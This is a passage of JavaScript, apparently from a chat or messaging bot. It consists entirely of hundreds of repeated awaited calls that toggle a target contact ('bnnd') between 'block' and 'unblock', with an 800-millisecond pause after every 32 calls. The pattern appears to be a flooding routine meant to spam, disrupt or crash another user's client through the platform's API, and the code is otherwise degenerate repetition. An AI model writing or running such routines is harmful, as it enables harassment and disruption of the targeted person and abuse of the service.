await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
